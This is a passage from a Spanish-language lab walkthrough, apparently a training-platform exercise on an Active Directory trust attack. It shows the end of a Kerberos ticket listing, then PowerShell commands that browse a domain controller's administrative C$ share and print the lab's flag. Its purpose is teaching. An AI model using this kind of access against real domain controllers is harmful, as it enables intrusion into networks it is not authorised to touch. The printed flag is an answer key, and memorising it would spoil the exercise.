        Renew Time: 8/2/2024 4:23:26 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

#### Acceso a la flag

```powershell
PS C:\Tools> ls \\academy-ea-dc01.inlanefreight.local\c$

    Directory: \\academy-ea-dc01.inlanefreight.local\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/31/2022  12:34 PM                Department Shares
d-----         4/7/2022   2:31 PM                ExtraSids
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---         4/9/2022   4:59 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----        3/31/2022  11:09 AM                User Shares
d-r---        10/6/2021  10:31 AM                Users
d-----        4/18/2022  11:37 AM                Windows
d-----        3/31/2022  11:12 AM                ZZZ_archive
```

```powershell
PS C:\Tools> ls \\academy-ea-dc01.inlanefreight.local\c$/ExtraSids

    Directory: \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/7/2022   2:31 PM             21 flag.txt
```

```powershell
PS C:\Tools> type \\academy-ea-dc01.inlanefreight.local\c$/ExtraSids/flag.txt
f@ll1ng_l1k3_d0m1no3$
```
